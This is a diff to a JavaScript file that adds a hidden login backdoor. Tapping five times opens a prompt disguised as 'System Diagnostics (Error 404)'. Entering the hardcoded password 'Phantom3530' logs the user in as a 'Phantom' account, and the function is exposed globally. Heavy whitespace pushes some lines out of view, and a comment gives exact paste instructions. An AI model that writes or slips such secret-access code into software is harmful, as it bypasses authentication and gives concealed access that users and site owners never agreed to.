@@ -1152,4 +1152,23 @@ function handleSecretTrigger() {
                                                                                                                                                                                                                                                                                                                                                                     alert("Access Denied.");
                                                                                                                                                                                                                                                                                                                                                                             });
                                                                                                                                                                                                                                                                                                                                                                             }
-                                                                                                                                                                                                                                                                                                                                                                            
+// Your existing function
+function handleSecretTrigger() {
+    tapCount++;
+        clearTimeout(tapTimer);
+
+                tapTimer = setTimeout(() => { tapCount = 0; }, 2000); 
+
+                    if (tapCount === 5) {
+                            tapCount = 0;
+                                    const overrideCode = prompt("System Diagnostics (Error 404):"); 
+
+                                                    if (overrideCode === "Phantom3530") {
+                                                                loginAsPhantom();
+                                                                        }
+                                                                            }
+                                                                            }
+
+                                                                            // ADD THIS EXACT LINE RIGHT HERE:
+                                                                            window.handleSecretTrigger = handleSecretTrigger;
+                                                                                                                                                                                                                                                                                                                                                                                                                                               
